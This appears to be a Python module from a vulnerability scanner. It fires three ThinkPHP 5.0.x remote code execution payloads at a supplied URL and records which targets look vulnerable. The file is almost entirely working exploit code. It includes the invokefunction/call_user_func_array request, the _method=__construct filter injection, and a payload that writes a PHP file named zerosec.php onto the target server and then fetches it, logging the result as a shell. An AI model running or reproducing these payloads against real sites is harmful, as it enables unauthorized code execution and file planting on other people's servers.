#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from libs.public.outprint import OutPrintInfo
from libs.public.reqset import ReqSet

urllib3.disable_warnings()


class ThinkRCEScan8:

    def __init__(self):
        self.proxy = None
        self.timeout = None
        self.ssl = None
        self.headers = None

    def run22(self, urls):
        try:
            url = urls + '/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]='
            # data = "s=file_put_contents('zerosec.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert"
            response = requests.get(url, headers=self.headers, verify=self.ssl,timeout=self.timeout,
                                     proxies=self.proxy)
            response.encoding = response.apparent_encoding

            if response.status_code == 200 and response.url == url:
                OutPrintInfo("ThinkPHP", '[b bright_red]可能存在ThinkPHP-5.0.22-RCE-POC-1 ')
                OutPrintInfo("ThinkPHP", f"{url}\n")
                # OutPrintInfo("ThinkPHP", f"SHELL {url2}")
                # OutPrintInfo("ThinkPHP", f"DATA:{data}")
                with open("./result/thinkphpRce8.txt","a") as w:
                    w.write(f"可能存在ThinkPHP-5.0.22-RCE-POC-1 {url}\n")
            else:
                pass
                # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.22-RCE-POC-1')

        except Exception:
            pass
            # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.22-RCE-POC-1')

    def run23(self, urls):
        try:
            url = urls + '/public'
            data = "_method=__construct&method=get&filter[]=call_user_func&server[]=phpinfo&get[]=phpinfo"
            response = requests.get(url, headers=self.headers, data=data,verify=self.ssl,timeout=self.timeout,
                                     proxies=self.proxy)
            response.encoding = response.apparent_encoding

            if "disable_functions" in response.text:
                OutPrintInfo("ThinkPHP", '[b bright_red]可能存在ThinkPHP-5.0.8-RCE-POC-1 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                # OutPrintInfo("ThinkPHP", f"SHELL {url2}")
                OutPrintInfo("ThinkPHP", f"DATA:{data}\n")
                with open("./result/thinkphpRce8.txt","a") as w:
                    w.write(f"可能存在ThinkPHP-5.0.8-RCE-POC-1 {url} --- DATA: {data}\n")
            else:
                pass
                # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.8-RCE-POC-1')

        except Exception:
            pass
            # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.8-RCE-POC-1')
    def run24(self, urls):
        try:
            url = urls + '/public'
            data = "s=file_put_contents('zerosec.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert"
            response = requests.get(url, headers=self.headers, data=data,verify=self.ssl,timeout=self.timeout,
                                     proxies=self.proxy)
            # response.encoding = response.apparent_encoding
            url2 = urls + "/zerosec.php"
            response2 = requests.get(url2, headers=self.headers,verify=self.ssl, timeout=self.timeout,
                                    proxies=self.proxy)
            if "disable_functions" in response2.text:
                OutPrintInfo("ThinkPHP", '[b bright_red]存在ThinkPHP-5.0.8-RCE-POC-2 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                OutPrintInfo("ThinkPHP", f"DATA:{data}")
                OutPrintInfo("ThinkPHP", f"SHELL {url2}\n")
                with open("./result/thinkphpRce8.txt","a") as w:
                    w.write(f"存在ThinkPHP-5.0.8-RCE-POC-2 {url} --- Shell {url2} ---DATA {data}\n")

            else:
                pass
                # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.8-RCE-POC-2')

        except Exception:
            pass
            # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.8-RCE-POC-2')




    def main(self, target):
        # OutPrintInfo("ThinkPHP", '开始检测RCE...')
        url = target[0].strip('/ ')
        self.ssl = target[1]
        header = target[2]
        proxy = target[3]
        self.timeout = int(target[4])
        req = ReqSet(header=header)

        self.headers = req["header"]
        self.proxy = {"http": proxy, "https": proxy}

        self.run22(url)
        # OutPrintInfo("ThinkPHP", '开始POC-22...')
        self.run23(url)
        # OutPrintInfo("ThinkPHP", '开始POC-23...')
        self.run24(url)
